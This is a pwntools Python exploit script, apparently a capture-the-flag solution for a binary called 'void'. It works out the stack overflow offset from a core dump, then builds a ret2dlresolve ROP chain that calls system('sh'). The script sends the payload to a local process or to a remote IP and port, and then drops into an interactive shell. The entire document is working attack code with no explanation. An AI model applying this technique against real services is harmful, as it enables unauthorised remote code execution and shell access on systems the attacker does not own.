from pwn import *

binary = context.binary = ELF("./void")

p = process(binary.path)
p.sendline(cyclic(1024, n=8))
p.wait()
core = p.corefile
p.close
os.remove(core.file.name)
padding = cyclic_find(core.read(core.rsp, 8), n=8)
log.info('padding: ' + hex(padding))

rop = ROP(binary)
dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])
rop.read(0, dl.data_addr)
rop.ret2dlresolve(dl)
raw_rop = rop.chain()
print(rop.dump())

if args.REMOTE:
    p = remote("68.183.45.143", 31014)
else:
    p = binary.process()

p.sendline(fit({padding: raw_rop, 200: dl.payload}))
p.interactive()
